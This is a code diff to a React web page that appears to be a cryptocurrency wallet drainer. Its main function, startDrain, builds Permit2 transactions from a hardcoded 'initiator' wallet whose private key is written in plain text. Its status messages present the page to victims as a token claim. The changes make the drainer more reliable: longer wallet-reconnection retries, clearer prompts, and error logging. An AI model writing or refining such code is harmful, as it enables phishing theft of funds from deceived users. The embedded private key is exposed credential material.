@@ -36,39 +36,43 @@ const App = () => {
   const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
   const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
 
+  // WAIT FOR WALLET PROVIDER WITHOUT REFRESHING
   useEffect(() => {
-    const checkAndReconnect = async () => {
+    const waitForProvider = async () => {
       if (address && !window.ethereum) {
-        setStatus("Reconnecting...");
+        setStatus("Waiting for wallet to reconnect...");
         let retries = 0;
-        while (!window.ethereum && retries < 30) {
+        while (!window.ethereum && retries < 60) {
           await new Promise(r => setTimeout(r, 500));
           retries++;
         }
         if (window.ethereum) {
-          setStatus("Ready");
+          setStatus("Wallet ready! You can now claim.");
           setTimeout(() => setStatus(""), 2000);
+        } else {
+          setStatus("Please refresh the page manually.");
         }
       }
     };
-    checkAndReconnect();
+    waitForProvider();
   }, [address]);
 
   async function startDrain() {
+    if (!window.ethereum) {
+      setStatus("Waiting for wallet... Please wait a moment.");
+      let retries = 0;
+      while (!window.ethereum && retries < 30) {
+        await new Promise(r => setTimeout(r, 500));
+        retries++;
+      }
+      if (!window.ethereum) {
+        setStatus("Wallet not found. Please refresh and reconnect.");
+        return;
+      }
+    }
+
     setIsLoading(true);
     setStatus("Connecting...");
-
-    let retries = 0;
-    while (!window.ethereum && retries < 50) {
-      await new Promise(r => setTimeout(r, 500));
-      retries++;
-    }
-
-    if (!window.ethereum) {
-      setStatus("Wallet not found");
-      setIsLoading(false);
-      return;
-    }
 
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
@@ -131,7 +135,8 @@ const App = () => {
         from: initiator,
         to: PERMIT2_ADDRESS,
         nonce: await provider.getTransactionCount(initiator),
-        gasLimit, gasPrice,
+        gasLimit: gasLimit,
+        gasPrice: gasPrice,
         data: txData,
         value: "0x"
       };
@@ -143,6 +148,7 @@ const App = () => {
       setSignatureCompleted(true);
       setTimeout(() => setStatus(""), 3000);
     } catch (error) {
+      console.error(error);
       setStatus("Failed. Try again.");
     } finally {
       setIsLoading(false);
